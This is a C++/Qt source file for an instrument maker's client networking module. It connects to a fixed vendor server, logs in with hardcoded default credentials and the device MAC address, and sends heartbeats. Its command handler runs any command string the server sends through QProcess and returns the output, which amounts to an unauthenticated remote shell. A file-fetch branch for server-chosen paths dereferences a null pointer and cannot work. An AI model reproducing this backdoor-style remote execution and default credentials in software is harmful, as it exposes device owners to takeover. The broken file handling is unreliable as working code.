/*******************************************************************************
 * Copyright (c) 2016,青岛艾普智能仪器有限公司
 * All rights reserved.
 *
 * version:     0.1
 * author:      link
 * date:        2016.12.17
 * brief:       二代客户端网络后台
*******************************************************************************/
#include "CTcpNetwork.h"
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      初始化
******************************************************************************/
CTcpNetwork::CTcpNetwork(QObject *parent) : QTcpSocket(parent)
{
    file         = NULL;
    count        = 0;
    LoadSize     = 4*1024;;
    BlockSize    = 0;
    BytesRead    = 0;
    BytesToRead  = 0;
    BytesToWrite = 0;
    BytesWritten = 0;

    QDir *dir = new QDir;
    if (!dir->exists(QString(TMP)))
        dir->mkdir(QString(TMP));
    if (!dir->exists(QString(NET)))
        dir->mkdir(QString(NET));

    Process = new QProcess(this);
    connect(Process,SIGNAL(readyRead()),this,SLOT(ProcessReady()));

    set = new QSettings(GLOBAL_SET,QSettings::IniFormat);
    set->setIniCodec("GB18030");

    timer = new QTimer(this);
    connect(timer,SIGNAL(timeout()),this,SLOT(KeepAlive()));
    connect(this,SIGNAL(connected()),this,SLOT(Connected()));
    connect(this,SIGNAL(readyRead()),this,SLOT(GetBlock()));
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      网络初始化
******************************************************************************/
void CTcpNetwork::ConnectToHost()
{
    this->connectToHost("s.aipuo.com", 6000);
    timer->start(10000);
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      网络退出
******************************************************************************/
void CTcpNetwork::Disconnect()
{
    this->close();
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      连接成功
******************************************************************************/
void CTcpNetwork::Connected()
{
    QUrl url;
    url.setScheme("aipuo");
#ifdef __arm__
    url.setUserName(set->value("/Factory/text","NULL").toString());
    url.setFragment(set->value("/Version/text","V0.1").toString());
#else
    url.setUserName(set->value("/Url/UserName","sa").toString());
    url.setFragment(set->value("/Url/Version","V0.1").toString());
#endif
    url.setPassword(set->value("/Url/Password","1234").toString());
    url.setHost("s.aipuo.com");
    url.setQuery("login");
    QString addr = "/";
    addr.append(this->HardwareAddress());
    url.setPath(addr);

    qDebug()<<url.toString();

    PutBlock(ADDR,ADDR,url.toString().toUtf8());
    timer->start(20000);
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      心跳
******************************************************************************/
void CTcpNetwork::KeepAlive()
{
    if (this->state() != QAbstractSocket::ConnectedState) {
        ConnectToHost();
        return;
    }
    QUrl url;
    url.setQuery("alive");
    PutBlock(ADDR,ADDR,url.toString().toUtf8());
    count++;
    if (count >6) {
        this->abort();
    }
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      读取数据
******************************************************************************/
void CTcpNetwork::GetBlock()
{
    quint16 addr;
    quint16 cmd;
    QByteArray msg;
    QDataStream in(this);
    in.setVersion(QDataStream::Qt_4_8);
    while (1) {
        if (BlockSize == 0) {
            if (this->bytesAvailable() < qint64(sizeof(qint64)))
                return;
            in >> BlockSize;
        }
        if (BlockSize > 8*1024) {
            qDebug() << "block size overflow";
            this->abort();
            return;
        }
        if (this->bytesAvailable() < BlockSize)
            return;
        in >> addr >> cmd >> msg;
        ExcuteCmd(msg);
        BlockSize = 0;
    }
}
/******************************************************************************
 * version:     1.0
 * author:      link
 * date:        2016.07.16
 * brief:       写数据
******************************************************************************/
void CTcpNetwork::PutBlock(quint16 addr,quint16 cmd,QByteArray data)
{
    QByteArray msg;
    QDataStream out(&msg, QIODevice::ReadWrite);
    out.setVersion(QDataStream::Qt_4_8);
    out<<(qint64)0<<quint16(addr)<<quint16(cmd)<<data;
    out.device()->seek(0);
    out<<(qint64)(msg.size()-sizeof(qint64));
    this->write(msg);
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.07.16
  * brief:      命令执行
******************************************************************************/
void CTcpNetwork::ExcuteCmd(QByteArray msg)
{
    timer->stop();
    count = 0;
    QUrl url(msg);
    if (url.query() == "alive")
        return;
    if (url.query() == "process") {
        ProcessStart(url);
        return;
    }
    if (url.query() == "get") {
        if (file == NULL) {
            file->setFileName(url.path());
            if (!file->exists()) {
                file = NULL;
                return;
            }
            if (!file->open(QFile::ReadOnly)) {
                file = NULL;
                return;
            }
            url.setQuery("put");
            file->seek(LoadSize*url.fragment().toInt());
            url.setFragment(file->read(LoadSize));
        }
    }
    timer->start(20000);
}

void CTcpNetwork::ProcessStart(QUrl url)
{
    Process->start(url.fragment());
}

void CTcpNetwork::ProcessReady()
{
    QUrl url;
    url.setQuery("process");
    url.setFragment(Process->readAll());
    PutBlock(ADDR,ADDR,url.toString().toUtf8());
}
/******************************************************************************
  * version:    1.0
  * author:     link
  * date:       2016.12.14
  * brief:      获取网卡硬件地址
******************************************************************************/
QString CTcpNetwork::HardwareAddress()
{
    QList<QNetworkInterface> list = QNetworkInterface::allInterfaces();
    for (int i=0; i<list.size(); i++) {
        if (list[i].hardwareAddress().size() != 17)
            continue;
        if (list[i].hardwareAddress() == "00:00:00:00:00:00")
            continue;
        return list[i].hardwareAddress();
    }
    return NULL;
}


